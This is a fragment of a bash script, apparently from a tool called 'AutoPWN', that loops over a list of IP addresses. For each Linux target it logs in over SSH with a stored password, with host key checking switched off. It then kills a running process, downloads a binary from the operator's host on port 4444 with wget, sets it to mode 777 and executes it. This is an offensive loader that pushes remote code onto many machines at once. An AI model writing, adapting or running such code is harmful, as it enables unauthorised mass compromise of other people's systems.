...
ip=$(sed "${i}q;d" "AutoPWN/ips.txt")
    ...
    if echo "$OS" | grep -q "LINUX"; then
        output=$(timeout 9 sshpass -p "$sshpassword" ssh -o StrictHostKeyChecking=no "$sshuser"@"$ip" "cd $linworkdir & pkill writer.elf & echo old > $linuxoutname & rm -f $linuxoutname & wget http://$youripalways:4444/$linuxoutname && chmod 777 $linuxoutname && echo correcto && ./$linuxoutname" 2>&1)
